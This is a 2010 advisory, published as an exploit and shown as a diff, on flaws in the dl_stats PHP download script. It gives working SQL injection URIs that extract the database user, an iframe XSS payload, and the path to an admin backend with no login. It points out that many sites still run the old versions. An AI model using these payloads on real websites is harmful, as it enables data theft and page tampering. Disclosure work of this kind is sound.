@@ -1,0 +1,58 @@
+[:::::::::::::::::::::::::::::::::::::: 0x1 ::::::::::::::::::::::::::::::::::::::]
+|:: >> General Information 
+|:: Advisory/Exploit Title = dl_stats Multiple Vulnerabilitie
+|:: Author = Valentin Hoebel
+|:: Contact = valentin@xenuser.org
+|:: 
+|:: 
+[:::::::::::::::::::::::::::::::::::::: 0x2 ::::::::::::::::::::::::::::::::::::::]
+|:: >> Product information
+|:: Name = dl_stats
+|:: Vendor = Claus van Beek
+|:: Vendor Website = http://clausvb.de/
+|:: Affected Version(s) = please view vulnerability details
+|:: 
+|:: 
+[:::::::::::::::::::::::::::::::::::::: 0x3 ::::::::::::::::::::::::::::::::::::::]
+|:: >> #1 Vulnerability
+|:: Type = SQL Injection
+|:: Affected Versions = > 2.0
+|:: Vulnerable File(s) = multiple files
+|:: Vulnerable Parameter(s) = multiple parameters
+|:: #1 Example URI = view_file.php?id=6+AND+1=2+UNION+SELECT+1,concat(user()),concat(user()),concat(user()),concat(user()),6,7,concat(user())--
+|:: #2 Example URI = download.php?id=2+AND+1=2+UNION+SELECT+1,concat(user()),3,concat(user()),concat(user())--
+|:: 
+|:: >> #2 "Vulnerability"
+|:: Type = Unprotected Admin Backend
+|:: Affected Versions = all
+|:: URI = admin/index.htm
+|:: This is not a real vulnerability. The admin backend simply isn't protected
+|:: by any login, the installation manual recommends to protect it with a
+|:: .htaccess file. Many webmasters just forget to do so.
+|::
+|:: >> #3 Vulnerability
+|:: Type = XSS
+|:: Affected Versions = > 2.0
+|:: Vulnerable File(s) = multiple files
+|:: Vulnerable Parameter(s) = multiple parameters
+|:: Example URI = download_proc.php?id=<iframe src=http://www.google.de>
+|:: 
+|:: 
+[:::::::::::::::::::::::::::::::::::::: 0x4 ::::::::::::::::::::::::::::::::::::::]
+|:: >> Additional Information
+|:: Advisory/Exploit Published = 18.04.2010
+|:: The vendor seems to have rewritten the dl_stats software. Since version 2.0
+|:: it validates the user input. The vendor only offers the latest version for download.
+|:: If you want to test around a little bit you maybe are lucky and find an old
+|:: version to download somewhere.
+|:: Although version 2.0 was released a long time ago, many websites still use the
+|:: old versions for their websites.
+|::
+|:: 
+[:::::::::::::::::::::::::::::::::::::: 0x5 ::::::::::::::::::::::::::::::::::::::]
+|:: >> Misc
+|:: Greetz && Thanks = inj3ct0r team, Exploit DB, hack0wn and ExpBase!
+|::
+|:: 
+[:::::::::::::::::::::::::::::::::::::: EOF ::::::::::::::::::::::::::::::::::::::]
+
